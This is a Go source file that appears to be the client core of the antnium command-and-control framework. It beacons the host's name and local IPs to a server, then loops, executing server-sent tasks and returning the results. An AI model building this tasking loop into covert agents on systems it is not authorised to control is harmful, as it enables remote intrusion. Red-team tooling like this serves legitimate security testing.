package client

import (
	"errors"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   ClientConfig
	Campaign model.Campaign

	upstream          Upstream
	downstreamManager DownstreamManager
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := model.MakeCampaign()
	upstream := MakeUpstream(config, campaign)
	downstreamManager := MakeDownstreamManager()

	w := Client{
		config,
		campaign,
		upstream,
		downstreamManager,
	}
	return w
}

func (s *Client) Start() {
	// start Downstream threads
	s.downstreamManager.start()
	// start Upstream thread
	go s.upstream.start()

	err := s.sendPing()
	if err != nil {
		// Handle server not reachable
		log.Error("Could not ping: ", err.Error())
	}

	var p model.Packet
	for {
		// Block until we receive a packet from server
		p = <-s.upstream.channel

		p, err = s.downstreamManager.do(p)
		if err != nil {
			log.Error("Err: ", err.Error())
		}

		// Send answer back to server
		s.upstream.channel <- p
	}
}

func (s *Client) sendPing() error {
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	response["hostname"] = s.Config.Hostname
	model.AddArrayToResponse("localIp", s.Config.LocalIps, response)
	model.AddArrayToResponse("downstreams", s.downstreamManager.GetList(), response)
	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)

	err := s.upstream.SendPacket(packet)
	if err != nil {
		return err
	}

	return nil
}
